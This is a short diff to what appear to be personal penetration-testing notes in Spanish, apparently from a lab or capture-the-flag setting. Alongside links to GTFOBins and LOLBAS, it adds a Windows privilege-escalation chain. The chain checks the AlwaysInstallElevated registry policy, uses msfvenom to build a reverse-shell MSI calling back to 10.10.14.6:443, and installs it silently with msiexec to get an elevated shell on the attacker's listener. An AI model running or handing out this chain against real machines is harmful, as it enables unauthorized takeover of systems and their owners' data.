@@ -6,3 +6,11 @@ https://gtfobins.github.io/#
 ## Windows
 https://lolbas-project.github.io/#
 #Binarios windows
+
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+#Enumerar registros de Windows
+
+msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -f msi -o rev.msi
+#Creo una reverse .msi
+msiexec /quiet /qn /i rev.msi
+#Ejecuto la reverse en el target para obtener shell como root en mi listener
